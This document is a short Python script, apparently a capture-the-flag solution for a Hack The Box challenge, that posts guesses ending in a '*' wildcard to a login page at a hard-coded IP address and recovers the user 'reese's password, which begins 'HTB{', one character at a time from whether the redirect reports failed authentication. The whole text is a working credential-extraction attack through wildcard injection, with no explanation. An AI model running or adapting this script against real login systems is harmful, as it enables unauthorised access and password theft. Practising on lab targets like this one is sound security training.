# failed login Authentication failed text on page or message get param
import string
import requests
import sys
from time import sleep

url = "http://206.189.115.160:30835/login"
failedText = "Authentication%20failed"
user = "reese"

alphabet = string.ascii_letters+string.digits + "_@{}-/()!\"$%=^[]:;"

def writeOnConsole(text):
    sys.stdout.write(f"\r{text}-x")

#user = reese
#password = bruteforce_part + *
password = "HTB{"
finish = False

while not finish:
    for char in alphabet:
        testPassword = password+str(char)+"*"
        writeOnConsole(testPassword)
        postData = {'username': user, 'password': testPassword}
        response = requests.post(url, postData)
        if not failedText in response.url:
            password += str(char)
            break
        sleep(0.01)





